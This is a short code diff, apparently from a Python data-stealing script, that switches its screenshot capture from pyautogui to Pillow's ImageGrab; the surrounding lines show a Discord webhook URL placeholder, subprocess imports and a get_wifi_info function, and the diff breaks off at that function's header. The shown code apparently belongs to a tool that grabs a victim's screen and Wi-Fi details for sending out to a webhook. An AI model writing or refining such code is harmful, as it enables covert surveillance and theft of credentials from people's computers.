@@ -1,13 +1,13 @@
 import requests
-import pyautogui
 import subprocess
 import os
+from PIL import ImageGrab  # Verwende Pillow für Screenshots
 
 # Webhook URL
 webhook_url = 'https://discord.com/api/webhooks/your_webhook_url'
 
 def capture_screenshot(output_path):
-    screenshot = pyautogui.screenshot()
+    screenshot = ImageGrab.grab()
     screenshot.save(output_path)
 
 def get_wifi_info(output_path):
